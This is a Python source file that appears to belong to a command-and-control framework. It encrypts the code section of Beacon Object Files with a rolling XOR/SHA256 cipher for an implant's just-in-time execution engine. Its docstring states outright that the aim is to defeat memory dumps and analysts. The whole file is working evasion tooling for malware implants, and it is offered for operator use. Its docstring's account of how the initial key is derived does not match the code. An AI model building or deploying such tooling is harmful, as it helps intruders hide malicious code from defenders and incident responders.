#!/usr/bin/env python3
"""
jit_encryptor.py - Rolling JIT Encryption Engine (Layer B)

NOVEL TECHNIQUE: Encrypts BOF .text section with a rolling XOR cipher.
The key for each byte depends on the PREVIOUS bytes (chaining).

This means:
  - The agent can only decrypt instruction N if it has executed N-1
  - Memory dump shows encrypted garbage (not BOF code)
  - Rolling key is derived from executed bytes (unpredictable)
  - Even if analyst captures the key, it's already changed

Encryption Algorithm:
  1. Initial key K0 = SHA256(BOF_size + random_seed)
  2. For byte i in .text:
       cipher[i] = plain[i] XOR K0[i % 32]
  3. After every N bytes (chunk_size), key rolls:
       K_new = SHA256(K_old + plain_bytes_executed)

The agent receives:
  - Encrypted .text section
  - Initial key (K0)
  - Chunk size (when to roll key)
  - Metadata for JIT engine (entry point, total size)

This file is called by server.py when operator runs 'jit_bof <name>'.
"""

import os
import sys
import struct
import hashlib
import json
import random
import shutil
import subprocess
import tempfile


# ============================================================
#  Constants
# ============================================================
JIT_MAGIC = b"JIT1"  # Magic for JIT-encrypted BOF
DEFAULT_CHUNK_SIZE = 16  # Roll key every 16 bytes


# ============================================================
#  BOF .text section parser (reused from fragment_compiler.py)
# ============================================================
def parse_coff_text_section(coff_path):
    """Parse a COFF .o file and extract the .text section."""
    with open(coff_path, 'rb') as f:
        data = f.read()

    if len(data) < 20:
        raise ValueError("File too small to be COFF")

    machine, num_sections, _, ptr_symtab, num_syms, sz_opt, _ = \
        struct.unpack_from('<HHIIIHH', data, 0)

    if machine != 0x8664:
        raise ValueError("Not an AMD64 COFF")

    text_data = None
    text_offset = 0
    text_size = 0

    sec_hdr_start = 20 + sz_opt
    for i in range(num_sections):
        off = sec_hdr_start + i * 40
        name_bytes = data[off:off+8]
        name = name_bytes.split(b'\x00')[0].decode('utf-8', errors='replace')

        vsize, vaddr, raw_size, raw_ptr, ptr_relocs, ptr_lines, \
            num_relocs, num_lines, char = struct.unpack_from('<IIIIIIHHI', data, off+8)

        if name == '.text':
            text_data = data[raw_ptr:raw_ptr + raw_size]
            text_offset = raw_ptr
            text_size = raw_size
            break

    if text_data is None:
        raise ValueError("No .text section found")

    return text_data, text_offset, text_size, data


# ============================================================
#  Rolling XOR Encryption
# ============================================================
def rolling_xor_encrypt(plaintext, initial_key, chunk_size=DEFAULT_CHUNK_SIZE):
    """Encrypt plaintext with rolling XOR cipher.

    Algorithm:
      1. key = initial_key (32 bytes)
      2. For each chunk of `chunk_size` bytes:
         - XOR plaintext with key
         - After chunk: key = SHA256(key + plaintext_chunk)

    Returns:
      (ciphertext, final_key)
    """
    ciphertext = bytearray(len(plaintext))
    key = bytearray(initial_key)
    key_cursor = 0

    for i in range(len(plaintext)):
        # XOR with current key
        ciphertext[i] = plaintext[i] ^ key[key_cursor]
        key_cursor += 1

        # Roll key after chunk_size bytes
        if key_cursor >= chunk_size:
            # Key rolls based on PLAINTEXT (not ciphertext)
            plain_chunk = plaintext[i+1-chunk_size : i+1]
            key = bytearray(hashlib.sha256(bytes(key) + plain_chunk).digest())
            key_cursor = 0

    return bytes(ciphertext), bytes(key)


# ============================================================
#  Create JIT-encrypted BOF binary
# ============================================================
def create_jit_bof(bof_o_path, output_path, verbose=False):
    """Create a JIT-encrypted BOF binary.

    Output format (JIT1):
      [4B magic "JIT1"]
      [4B text_size]
      [4B chunk_size]
      [32B initial_key]
      [N bytes: encrypted_text]
      [4B full_coff_size]
      [M bytes: full_coff_data]  (needed for relocations/symbols)

    The agent's JIT engine:
      1. Reads encrypted_text + initial_key
      2. Decrypts one chunk at a time into scratch pad
      3. Executes from scratch pad
      4. Rolls key based on decrypted bytes
      5. Re-encrypts scratch pad after execution

    Note: The full COFF is appended for symbol/relocation info.
    The .text section in the COFF is replaced with encrypted version.
    """
    if verbose:
        print(f"[*] JIT encrypting: {bof_o_path}")

    # Parse .text section
    text_data, text_offset, text_size, full_coff = parse_coff_text_section(bof_o_path)

    if verbose:
        print(f"[*] .text section: {text_size} bytes (offset 0x{text_offset:X})")

    # Generate random initial key (32 bytes)
    initial_key = bytes([random.randint(0, 255) for _ in range(32)])

    if verbose:
        print(f"[*] Initial key: {initial_key.hex()[:32]}...")

    # Encrypt .text with rolling XOR
    chunk_size = DEFAULT_CHUNK_SIZE
    encrypted_text, final_key = rolling_xor_encrypt(text_data, initial_key, chunk_size)

    if verbose:
        print(f"[*] Encrypted .text: {len(encrypted_text)} bytes")
        print(f"[*] Chunk size: {chunk_size} (key rolls every {chunk_size} bytes)")
        print(f"[*] Final key: {final_key.hex()[:32]}...")

    # Build JIT binary
    jit_binary = JIT_MAGIC                           # 4 bytes
    jit_binary += struct.pack('<I', text_size)        # 4 bytes
    jit_binary += struct.pack('<I', chunk_size)       # 4 bytes
    jit_binary += initial_key                         # 32 bytes
    jit_binary += encrypted_text                      # N bytes

    # Append full COFF (for symbols/relocations — agent needs this)
    jit_binary += struct.pack('<I', len(full_coff))   # 4 bytes
    jit_binary += full_coff                           # M bytes

    with open(output_path, 'wb') as f:
        f.write(jit_binary)

    if verbose:
        print(f"\n[+] JIT encryption complete!")
        print(f"    Output: {output_path}")
        print(f"    Size: {len(jit_binary)} bytes")
        print(f"    (Original .o: {len(full_coff)} bytes)")

    return {
        'output': output_path,
        'size': len(jit_binary),
        'text_size': text_size,
        'chunk_size': chunk_size,
        'encrypted_text_size': len(encrypted_text),
    }


# ============================================================
#  Main
# ============================================================
def main():
    import argparse

    p = argparse.ArgumentParser(description='BOF JIT Encryption Engine (Layer B)')
    p.add_argument('bof_path', help='Path to BOF .o file')
    p.add_argument('-o', '--output', default=None,
                   help='Output path (default: <name>.jit.bin)')
    p.add_argument('-v', '--verbose', action='store_true')
    args = p.parse_args()

    if args.output is None:
        base = os.path.splitext(os.path.basename(args.bof_path))[0]
        args.output = f"{base}.jit.bin"

    create_jit_bof(args.bof_path, args.output, verbose=args.verbose)


if __name__ == '__main__':
    main()
